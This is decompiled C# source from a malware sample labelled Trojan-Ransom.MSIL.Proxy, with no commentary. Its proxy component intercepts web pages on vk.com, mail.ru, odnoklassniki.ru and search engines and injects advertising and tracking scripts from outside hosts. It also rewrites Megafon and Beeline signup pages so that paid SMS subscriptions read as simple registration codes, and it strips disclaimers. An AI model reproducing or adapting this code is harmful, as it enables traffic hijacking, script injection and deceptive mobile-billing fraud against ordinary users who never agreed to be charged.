// Decompiled with JetBrains decompiler
// Type: ProxyService.XmlHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2B8E9BB-A5D7-4D5C-B4AE-5A3C98D271C3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-5d65d7203a5637d6cc5764c9c504b661d11d754618d256d3ba43309573d0cd77.exe

using System;
using System.Collections.Generic;
using System.Net;

namespace ProxyService
{
  public class XmlHelper
  {
    public static List<XmlHelper.keyword> keys = new List<XmlHelper.keyword>();

    public static void Load()
    {
    }

    public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
    {
      string str1 = req.Address.ToString();
      string str2 = "";
      try
      {
        str2 = resp.ContentType;
        string referer = req.Referer;
      }
      catch (Exception ex)
      {
      }
      if (!str2.Contains("text/html") || !str1.Contains("http://") && !str1.Contains("https://"))
        return false;
      return str1.Contains("vk-vmeste.ru") || str1.Contains("vk.com") && !str1.Contains("widget_comments") && !str1.Contains("q_frame.php") || str1.Contains("mail.ru") || str1.Contains("odnoklassniki.ru") || str1.Contains("zip-connectio.in") || str1.Contains("signup.beeline.ru") || str1.Contains("wap.megafonpro.ru") || str1.Contains("sexkiss.ru") || str1.Contains("yandex.ru/yandsearch") || str1.Contains("yandex.ua/yandsearch") || str1.Contains("yandex.kz/yandsearch") || str1.Contains("yandex.by/yandsearch") || str1.Contains("google.com/") && str1.Contains("q=") || str1.Contains("google.ru/") && str1.Contains("q=") || str1.Contains("google.com.ua/") && str1.Contains("q=") || str1.Contains("google.kz/") && str1.Contains("q=") || str1.Contains("google.by/") && str1.Contains("q=") || str1.Contains("support-contact.ws") || str1.Contains("youtube.com") || str1.Contains("rutube.ru");
    }

    public static int rnd(int from) => new Random().Next(0, from);

    public static string ChangeContent(string str, string url, string refx)
    {
      if (url.Contains("sexkiss.ru"))
        return "ошибка";
      ProxyServer.dbg("change: " + url + "/" + refx);
      if (url.Contains("vk-vmeste.ru"))
      {
        vkbill.vkCatchBilled(str);
        return str;
      }
      string str1 = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
      string newValue1 = str1 + " ";
      string str2 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=3; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
      string str3 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
      string str4 = "\r\n<script language='javascript' type='text/javascript' src='http://popikundik.tip-tip.ru/5pdvtwcu3a498u0ohrq7mc1bl6otjsd1'></script>\r\n";
      string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
      string str5 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=2; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
      string str6 = "";
      string[] strArray = new string[2]
      {
        str2 + str3,
        str2 + str3
      };
      if (url.Contains("vk.com"))
      {
        if (vkbill.IsInjectVKBill(url, str))
        {
          str = vkbill.vkBillCode(str);
        }
        else
        {
          str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue1);
          str = str.Replace("<div id=\"left_blocks\"></div>", "");
          str = str.Replace("<div id=\"left_ads\"></div>", strArray[XmlHelper.rnd(strArray.Length)]);
          str += str6;
        }
        return str;
      }
      if (url.Contains("odnoklassniki.ru"))
        return str.Replace("</body></html>", "</body>" + str1 + " " + str4 + "</html>");
      if (url.Contains("mail.ru"))
      {
        str = str.Replace("<script>splashRadar('informers');</script>", str5 + " " + str4);
        str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
        return str;
      }
      if (url.Contains("wap.megafonpro.ru"))
      {
        string str7 = "Подписка ";
        string str8 = "Условиями предоставления услуги Подписки";
        int num1 = str.IndexOf(str7);
        int num2 = str.IndexOf(str8, Math.Max(0, num1));
        if (num1 != -1 && num2 != -1)
        {
          string oldValue = str.Substring(num1, num2 - num1 + str8.Length);
          str = str.Replace(oldValue, "Введите полученный код с бесплатного сервисного номера");
          str = str.Replace("Введите SMS пароль", "");
        }
        return str;
      }
      if (url.Contains("signup.beeline.ru"))
      {
        str = str.Replace("Оформление подписки", "Регистрация на сайте");
        str = str.Replace("Ð¿Ð\u00BEÐ´Ð¿Ð¸Ñ\u0081ÐºÐ¸", "");
        str = str.Replace("отправлена смс с кодом активации подписки", "отправлена смс с кодом подтверждения");
        str = str.Replace("input type=\"text\" name=\"\"", "input type=\"hidden\" name=\"\"");
        str = XmlHelper.rep(str, "<td width=\"70%\">", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td colspan=\"2\" align=\"center\">", "</td>", "");
        return str;
      }
      if (url.Contains("zip-connectio.in"))
      {
        string from = "<div id=\"disclaimerDetails\"";
        string tos = "</div>";
        str = XmlHelper.rep(str, from, tos, "");
        return str;
      }
      if (url.Contains("youtube.com") || url.Contains("rutube.ru") || url.Contains("yandex.") && url.Contains("yandsearch") || url.Contains("google.") && url.Contains("q="))
        str += "<script src='http://contact-under.ru/upper_vk.js'></script>";
      if (url.Contains("support-contact.ws"))
        str = "<html><script>document.location='http://adobe.com'</script></html>";
      return str;
    }

    private static string rep(string str, string from, string tos, string withs)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 != -1 && num2 != -1)
      {
        string oldValue = str.Substring(num1, num2 - num1 + tos.Length);
        str = str.Replace(oldValue, withs);
      }
      return str;
    }

    public static string extr(string str, string from, string tos, bool withCorners)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 == -1 || num2 == -1)
        return "";
      return !withCorners ? str.Substring(num1 + from.Length, num2 - num1 - from.Length) : str.Substring(num1, num2 - num1 + tos.Length);
    }

    public static string rndtext() => new Random().Next(1, 100000).ToString();

    public struct keyword
    {
      public int tickcount;
      public string key;
    }
  }
}
